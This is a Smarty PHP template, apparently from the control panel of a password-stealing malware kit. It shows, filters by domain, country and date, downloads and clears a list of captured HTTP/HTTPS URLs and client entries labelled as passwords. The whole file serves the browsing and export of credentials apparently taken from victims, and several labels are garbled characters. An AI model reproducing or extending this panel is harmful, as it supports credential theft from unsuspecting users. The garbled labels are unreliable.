{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}
{assign var='no_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=http"}

{if {$smarty.request.routine|default:''} == 'confirm_clear_http'}
{assign var='msg' value="Are you sure you want to clear the HTTP list?"}
{assign var='yes_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=http&amp;routine=clear_http"}
{include file='confirm.tpl'}
{/if}

	{append var="cont_codes" value="Europe" index="EU"}
	{append var="cont_codes" value="North America" index="NA"}
	{append var="cont_codes" value="South America" index="SA"}
	{append var="cont_codes" value="Asia" index="AS"}
	{append var="cont_codes" value="Africa" index="AF"}
	{append var="cont_codes" value="Oceania" index="OC"}
	{append var="cont_codes" value="Antarctica" index="AN"}
	{append var="cont_codes" value="Others" index="--"}

	{foreach from=$cont_codes key=continent_code item=continent_name}
		{if isset($smarty.request.{"country_"|cat:{$continent_code|lower}})}
			{assign var="country_value_set" value="true"}
		{/if}
	{/foreach}

	{if $smarty.request.filter_include_http|default:'' != '' || $smarty.request.filter_include_https|default:'' != '' || $smarty.request.filter_domains_include|default:'' != '' || $smarty.request.filter_domains_exclude|default:'' != '' || isset($country_value_set) || $smarty.request.filter_date_from|default:'' != '' || $smarty.request.filter_date_to|default:'' != '' || $smarty.request.filter_text|default:'' != ''}
		<h4>Attention! Filter Activated. <a href="{$smarty.server.SCRIPT_NAME}?action=http">Cancel</a>.</h4><br />
	{/if}

	<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?action=http&amp;routine=download_http">Download HTTP list</a> (<b>{$total_http_items_count}</b> {$total_http_items_count|items})<br />
	{if $priv_can_delete}
		<a class="delete_nav" href="{$smarty.server.SCRIPT_NAME}?action=http&amp;routine=confirm_clear_http">Clear HTTP list</a><br />
	{/if}

	<a class="filter_nav" href="#" onclick="javascript:$('#filter_frm_block').slideToggle();">Show filter</a>
	{if isset($filtered_items_count)}
		{if $filtered_items_count > 0}
			(������� <b>{$filtered_items_count}</b> {$filtered_items_count|items}, <a href="#" onclick="javascript:$('#routine').val('filter_download'); $('#filter_frm').submit(); $('#routine').val(''); return false;"><b>Download</b></a>)
		{else}
			(No Results)
		{/if}
	{/if}
	<br />
	<br />

	<div id="filter_frm_block" style="display:none;width:500px">
		<form id="filter_frm" name="filter_frm" action="" method="post">
		<input type="submit" style="position:absolute;left:-10000px;top:-10000px;" />
		<input type="hidden" name="routine" id="routine" value=""  />
		<div id="tabs">
			<ul>
				<li><a href="#tabs-1">Filter</a></li>
				<li><a href="#tabs-2">Filter by country</a></li>
				<li><a href="#tabs-3">Filter by date</a></li>
			</ul>
			<div id="tabs-1">
				<br />

				<input type="hidden" name="action" value="http" />
				<p style="margin-left:10px;">Included in the list only certain domains: <br /><input style="width:250px;" name="filter_domains_include" value="{$smarty.request.filter_domains_include|default:''}" /> <br /><small>(You can specify multiple comma-separated)</small></p><br />
				<p style="margin-left:10px;">Exclude domains: <br /><input style="width:250px;" name="filter_domains_exclude" value="{$smarty.request.filter_domains_exclude|default:''}" /> <br /><small>(You can specify multiple comma-separated)</small></p><br />
				<p style="margin-left:10px;">Search text: <br /><input style="width:250px;" name="filter_text" value="{$smarty.request.filter_text|default:''}" /> <br /><small>(Substring search, works very fast)</small></p><br />

					<input style="margin-left:10px;" type="checkbox" id="filter_include_http" name="filter_include_http" value="1"
					{if !isset($country_value_set) || $smarty.request.filter_include_http|default:'' == '1'}
						checked="checked"
					{/if}
					/><label for="filter_include_http"> Enable HTTP</label><br />
					<input style="margin-left:10px;" type="checkbox" id="filter_include_https" name="filter_include_https" value="1"
					{if !isset($country_value_set) || $smarty.request.filter_include_https|default:'' == '1'}
						checked="checked"
					{/if}
					/><label for="filter_include_https"> Enable HTTPS</label><br /><br />

				<div class="buttons">
					<button class="neutral" onclick="javascript:clear_form('#filter_frm'); $(':input', '#tabs-3').val(''); reset_drop_lists(); $('#filter_include_http').attr('checked', 'checked'); return false;" style="width:110px;">
						<img src="includes/design/images/reset_icon.png" alt="" />
						Reset
					</button>
					<button class="positive" onclick="javascript:document.filter_frm.submit();" style="width:130px;">
						<img src="includes/design/images/find_icon.png" alt="" />
						Activate
					</button>
				</div>

				<br /><br />
			</div>
			<div id="tabs-2">
				{foreach from=$cont_codes key=continent_code item=continent_name}
					<label style="display: inline; width: 150px; float: left;">
					{$continent_name}:
					</label>
					<div style="display: inline; float: left">
			        <select id="drop_{$continent_code|lower}" multiple="multiple" name="country_{$continent_code|lower}[]">
						{foreach from=$geo_continents.$continent_code item=country name=traversal}
							<option
							{if !isset($smarty.request.{"country_"|cat:{$continent_code|lower}})}
								{if !isset($country_value_set)}
									{if $smarty.foreach.traversal.index == 0} selected="selected"{/if}
								{/if}
							{else}
								{if {$country.code}|array_search:$smarty.request.{"country_"|cat:{$continent_code|lower}} !== false}
								selected="selected"
								{/if}
							{/if}
							value="{$country.code}"
							>{$country.name}</option>
						{/foreach}
			        </select>
			        </div>
			        <br />
			        <br />
				{/foreach}

				<div class="buttons">
					<button class="neutral" onclick="javascript:uncheck_drop_lists(); return false;" style="width:200px;">
						<img src="includes/design/images/reset_icon.png" alt="" />
						�������� ������ �����
					</button>
				</div>
				<br />
				<br />
			</div>
			<div id="tabs-3">
				<p style="margin-left:10px;">Including passwords from the day:<br /><input type="text" style="width:260px" name="filter_date_from" id="datepicker_from" value="{$smarty.request.filter_date_from|default:''}" /></p><br />
				<p style="margin-left:10px;">Enable passwords only until the next day:<br /><input type="text" style="width:260px" name="filter_date_to" id="datepicker_to" value="{$smarty.request.filter_date_to|default:''}" /></p><br />
			</div>
		</div>
		</form>

		<br />
	</div>

	{if isset($filtered_items_list)}
		{assign var="http_list" value=$filtered_items_list}
	{/if}

	{if count($http_list)}
		{if isset($filtered_items_list)}
			<h4>Example filtered HTTP records</h4>
			<table id="table_http" width="800px" cellspacing="0" summary="HTTP filter examples">
		{else}
			<h4>Latest HTTP</h4>
			<table id="table_http" width="800px" cellspacing="0" summary="Latest HTTP additions">
		{/if}

		<tr>
			<th width="55%">URL</th>
			<th width="25%">HTTP Client</th>
			<th width="20%">Time added</th>
		</tr>

		{foreach from=$http_list item=http_item}
			{assign var=img_file value="includes/design/images/modules/"|cat:$http_item.module|cat:".png"}
			{if file_exists($img_file)}
				{assign var=img_url value="<img style=\"margin-top:-2px;vertical-align:middle;\" src=\""|cat:$img_file|cat:"\" width=\"16\" height=\"16\" alt=\"\" /> "}
			{else}
				{assign var=img_url value=""}
			{/if}

			<tr>
			{if strlen($http_item.url) < 60}
			<td>
			{else}
			<td title="{$http_item.url}">
			{/if}
			{$http_item.url|truncate:60:'...':true:false}</td>
			<td style="padding-bottom:2px">{$img_url nofilter}{$http_item.ftp_client}</td>
			<td>{$http_item.import_time}</td>
			</tr>
		{/foreach}

		</table><br />
	{else}
		{if isset($filtered_items_list)}
			<h4>Filter items found!</h4>
		{else}
			<h4>List of HTTP is empty!</h4>
		{/if}
	{/if}
{else}
	{include file='error.tpl' err_code='ERR_NOT_ENOUGH_PRIVILEGES'}
{/if}